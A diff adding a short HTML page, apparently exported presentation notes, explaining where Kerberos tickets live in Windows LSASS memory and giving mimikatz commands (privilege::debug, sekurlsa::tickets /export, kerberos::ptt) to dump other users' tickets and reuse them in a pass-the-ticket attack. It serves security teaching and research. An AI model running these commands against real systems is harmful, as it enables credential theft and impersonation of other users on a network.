@@ -1,0 +1,32 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>From Client LSASS Memory</title>
+</head><body>TGT &amp; TGS are in client LSASS memory<br/>
+The "normal" way: by API<br/>
+&nbsp;&#09;Users can only export their ticket(s) (without privilege)<br/>
+&nbsp;&#09;For TGT: AllowTgtSessionKey registry key must be set for session key export...<br/>
+&nbsp;&#09;&#09;(Mandatory to use the TGT)<br/>
+&nbsp;&#09;For TGS: no restriction at all<br/>
+To get tickets: LsaCallAuthenticationPackage/KerbRetrieveEncodedTicketMessage<br/>
+&nbsp;&#09;In mimikatz:kerberos::list [/export]<br/>
+To pass-the-ticket: LsaCallAuthenticationPackage/KerbSubmitTicketMessage<br/>
+&nbsp;&#09;In mimikatz:kerberos::ptt ticket.kirbi<br/>
+<br/>
+Not a hack: http://msdn.microsoft.com/library/windows/desktop/aa378099.aspx<br/>
+<br/>
+Ok, but I want <i>other</i>&nbsp;people's TGT &amp; TGS!<br/>
+Raw memory reading (yep, even with minidump<br/>
+This time will all session keys<br/>
+<br/>
+Mimikatz<br/>
+# privilege::debug<br/>
+# sekurlsa::tickets /export<br/>
+<br/>
+<img src="image.png" /><br/>
+<br/>
+Then use it:<br/>
+# kerberos::ptt ticket.kirbi<br/>
+<br/>
+</body></html>
